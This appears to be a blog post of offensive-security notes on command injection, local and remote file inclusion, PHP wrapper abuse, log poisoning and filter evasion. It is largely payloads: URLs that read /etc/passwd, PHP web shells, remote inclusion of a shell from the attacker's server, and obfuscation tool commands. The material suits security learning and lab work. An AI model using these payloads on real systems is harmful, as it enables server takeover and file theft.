---
title: Notes | Command Injection
author: BatBato
date: 2022-08-25
categories: [Notes, Command Injection]
tags: [Command Injection, Web, Bypass]
permalink: /Notes/Web/Command_Injection
---

# Command Injection

A command injection occurs when a user input is not sanitised. A basic example can be a ping command. If a user can enter the IP of the machine and the IP is not sanitised, we could type whatever we want. We could type ```127.0.0.1``` but we also could type ```127.0.0.1 && ls```. This can allow a malicious user to execute any command on the server.

## Local File Inclusion

Local File Inclusion (```LFI```) is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time.

Some basic LFI could be :

```console
http://SITE/index.php?SOMETHING=/etc/passwd
```

This can print the ```passwd``` file if the site is vulnerable to ```LFI```.

> Note the ```SOMETHING``` argument. You will need to change the ```SOMETHING``` with the injectable parameter you have found.
{: .prompt-warning }

> This is due to an unsanitised ```inculde``` like : ```include($_GET['SOMETHING']); ```
{: .prompt-info }

### Path traversal

The ```path traversal``` technique consists of accessing a file by ```traversing``` to the root directory.

```console
http://SITE/index.php?SOMETHING=../../../../../../../../../etc/passwd
```

> Depending on where the website is hosted on the server, you may need to use a different number of ```../```
{: .prompt-info }

> If the include looks like ```include("lang_" . $_GET['SOMETHING']);``` then you may need to user ```/../``` instead of ```../```
{: .prompt-info }

### Blacklisting

Some characters may be blacklisted and replaced. For example, this ```$something = str_replace('../', '', $_GET['SOMETHING']);``` replace the ```../``` by ```./``` so our previous ```../../../etc/passwd``` will be replaced by ```./etc/passwd```.
We will need to use the following payload : 
```console
http://SITE/index.php?SOMETHING=....//....//....//....//....//etc/passwd
```

> You can also use URL encoding. For example, replacing ```../``` by ```%2e%2e%2f```. For more URL encoding look at the [Bypass Techniques](#Bypass Techniques) part.
{: .prompt-tip }

### Appended Extension 

If you try the basic LFI technique and the URL is redirected to ```http://SITE/index.php?SOMETHING=/etc/passwd.php``` then the server append the ```.php``` extension.
We can then try to navigate to ```http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ```. We can use the curl command as follows ```curl http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ``` and then use the ```base64 -d``` command to decode it.

We could also try to use the null byte ```%00``` to get rid of the extension :
```console
http://SITE/index.php?SOMETHING=/etc/passwd%00
```

## PHP Wrappers

### Except Wrapper

Wrappers allow us to execute commands, access files or URLs... Some basic example of its use is the following :
```console
http://SITE/index.php?SOMETHING=expect://id
```

### Data Wrapper

We have just seen how we can use the ```except``` wrapper. Now let's take a look at the ```data``` wrapper. 

> The following will only work if the ```allow_url_include``` is activated in the ```/etc/php/X.Y/apache2/php.ini``` file for ```Apache``` or if the ```allow_url_include``` is activated in the  ```/etc/php/X.Y/fpm/php.ini``` file for ```Nginx```.
{: .prompt-danger }

We can create a classic web shell like : 
```console
echo '<?php system($_GET['cmd']); ?>' | base64
```

We can now navigate to ```http://SITE/index.php?SOMETHING=data://text/plain;base64,BASE64_STING&cmd=id```. Don't forget to change ```BASE64_STING``` to the base64 web shell we generated.

### Input Wrapper 

> Same as Data Wrapper, we need to have the ```allow_url_include``` activated.
{: .prompt-danger }

We can use the ```cURL``` program. The following command will show the output for the ```id``` command but you can change it for any other command you want.

```console
curl -s -X POST --data "<?php system('id'); ?>" "http://SITE/index.php?SOMETHING=php://input"
```

## Apache / Nginx Log poisoning

Log poisoning is a technique that we can use to execute command and print their result in the logs. You can find log files in different locations but here is a list of several of them :
```
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
/proc/self/environ
```

We are going to take the example of an Apache log poisoning here. If we can see the logs when we go to the following URL then the server may be vulnerable to log poisoning: 
```console
http://SITE/index.php?SOMETHING=/var/log/apache2/access.log
```

We can use the tool ```Burp Suite``` for this attack to easily and rapidly execute commands. 
1. Start the ```Burp proxy``` and intercept the request to the log file.
2. We then ```CTRL+R``` to send it to the ```repeater```.
3. Change the User-Agent to ```<?php system($_GET['cmd']); ?>```
4. Navigate in the ```repeater``` to ```http://SITE/index.php?SOMETHING=/var/log/apache2/access.log&cmd=id``` with the previous User-Agent

## Remote File Inclusion

Remote file inclusion (RFI) occurs when the web application downloads and executes a remote file. These remote files are usually obtained in the form of an HTTP or FTP URI as a user-supplied parameter to the web application.

> allow_url_fopen (activated by default) and allow_url_include should be activated
{: .prompt-danger }

1.  
```console
python3 -m http.server 8080
```
or
```console
python3 -m SimpleHTTPServer 8080
```

First we need to launch a server here a web server.

2.
```console
echo "<?php system($_GET['cmd']); ?>" > shell.php
```

Then we create a classic web shell. You can also use pre-made web shell like [this one](https://github.com/inforkgodara/php-web-shell/blob/main/php-web-shell.php), for example.

3. ```http://SITE/index.php?SOMETHING=http://[OUR_IP]:8080/shell.php&cmd=id```

Then we need to specify our IP and port so that the web shell is executed. Here we have executed the "id" command.

If the server was on the windows machine we may have preferred a SMB share instead. We would have done the following steps :

1.
```console
smbserver.py -smb2support share $(pwd)	
```

Here we start an SMB server.

2. ```http://SITE/index.php?SOMETHING=\\[OUR_IP]\share\shell.php&cmd=id```


## Bypass Techniques 

We may have to bypass several protections. We can replace some characters with their URL encoded string, with some variable... Here is an array containing several examples.

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
|--------------- | --------------- | --------------- | --------------- |
| Semicolon | ; | %3b | Both |
| Space | + | %20 | Both |  
| Space | ${IFS} | %20 | Both |
| New Line | \n | %0a | Both |
| Tab | \t | %09 | Both |
| Background | & | %26 | Both (second output generally shown first) |
| Pipe | \| | %7c | Both (only second output is shown) |
| AND | && | %26%26 | Both (only if first succeeds) |
| OR | \|\| | %7c%7c | Second (only if first fails) |
| Sub-Shell | \`\` | %60%60 | Both (Linux-only) |
| Sub-Shell | $() | %24%28%29 | Both (Linux-only) |

## Evasion Tools

We can use evasion tools so that they create us the strings we can directly use for command injections instead to create them manually.

### Bashfuscator - Linux

- Setup :
```console
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
cd ./bashfuscator/bin/
```

- Usage example :
```console
./bashfuscator -c 'cat /etc/passwd'
./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

### DOSfuscation - Windows

- Setup :

```console
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
```


- Usage :

```console
SET COMMAND type C:\Users\Bob\Desktop\flag.txt
encoding
1
```
